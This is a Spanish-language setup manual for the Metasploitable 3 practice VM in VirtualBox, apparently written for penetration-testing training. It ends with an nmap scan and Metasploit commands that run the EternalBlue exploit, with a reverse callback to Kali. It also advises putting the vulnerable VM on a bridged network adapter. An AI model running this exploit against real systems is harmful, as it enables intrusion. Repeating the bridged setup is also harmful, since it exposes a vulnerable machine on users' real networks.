# **Manual de Instalación de Metasploitable 3 en VirtualBox**

## **1. Introducción**
**Metasploitable 3** es una máquina virtual vulnerable diseñada para pruebas de penetración y entrenamiento en ciberseguridad. Este manual detalla la instalación en **VirtualBox** y su configuración con **Kali Linux** para realizar pruebas de seguridad.

---
## **2. Requisitos Previos**

### **2.1 Requisitos de Software**
Asegúrate de tener instalados los siguientes programas:

- **VirtualBox** (https://www.virtualbox.org/wiki/Downloads)
- **Vagrant** (https://developer.hashicorp.com/vagrant/downloads)
- **Packer** (https://developer.hashicorp.com/packer/downloads)
- **Git** (https://git-scm.com/downloads)

### **2.2 Requisitos de Hardware**
- **Mínimo:** 4 GB de RAM, 60 GB de espacio en disco.
- **Recomendado:** 8 GB de RAM para mejor rendimiento.

---
## **3. Instalación de Dependencias**

### **3.1 En Windows**
1. Descarga e instala **VirtualBox, Vagrant, Packer y Git** desde los enlaces proporcionados.
2. Verifica la instalación ejecutando en la terminal **CMD**:
   ```bash
   vagrant --version
   packer --version
   git --version
   ```

### **3.2 En Linux (Ubuntu/Debian)**
Ejecuta en la terminal:
```bash
sudo apt update && sudo apt install virtualbox vagrant git unzip -y
wget https://releases.hashicorp.com/packer/1.9.2/packer_1.9.2_linux_amd64.zip
unzip packer_1.9.2_linux_amd64.zip
sudo mv packer /usr/local/bin/
```
Verifica la instalación:
```bash
vagrant --version
packer --version
```

---
## **4. Descargar y Configurar Metasploitable 3**

### **4.1 Clonar el Repositorio Oficial**
Ejecuta en la terminal:
```bash
git clone https://github.com/rapid7/metasploitable3.git
cd metasploitable3
```

### **4.2 Construcción de la Máquina Virtual**

**Opcion 1: Windows Server 2008**
```bash
packer build windows_2008.json
```

**Opcion 2: Ubuntu 14.04**
```bash
packer build ubuntu_1404.json
```
Este proceso puede tardar entre **20 y 40 minutos**.

---
## **5. Iniciar Metasploitable 3 en VirtualBox**

Ejecuta:
```bash
vagrant up
```
Para acceder por SSH:
```bash
vagrant ssh
```
O abre VirtualBox y ejecuta la VM "Metasploitable3" manualmente.

---
## **6. Configurar Red en VirtualBox**

1. Abre **VirtualBox**.
2. Ve a **Configuración** > **Red**.
3. Cambia "Conectado a:" por **"Adaptador puente"**.
4. Guarda y reinicia la máquina virtual.
5. Verifica la IP con:
   ```bash
   ipconfig   # En Windows
   ifconfig   # En Linux
   ```

---
## **7. Escaneo y Explotación con Metasploit**

Desde Kali Linux, escanea Metasploitable 3:
```bash
nmap -p- -sV -sC <IP_de_Metasploitable3>
```

### **Ejemplo de Explotación con Metasploit**
1. Iniciar Metasploit:
   ```bash
   msfconsole
   ```
2. Buscar el exploit **EternalBlue (MS17-010)**:
   ```bash
   search ms17_010
   ```
3. Configurar y ejecutar el exploit:
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOST <IP_de_Metasploitable3>
   set LHOST <IP_de_Kali>
   exploit
   ```

---
## **8. Solución de Problemas**

### 🔴 **Error: Vagrant no inicia la VM**
Ejecuta:
```bash
vagrant destroy
vagrant up --provision
```

### 🔴 **Error: VirtualBox no detecta la VM**
Importa manualmente la VM en VirtualBox.

### 🔴 **Error: Packer no se ejecuta correctamente**
Verifica los permisos:
```bash
chmod +x /usr/local/bin/packer
```
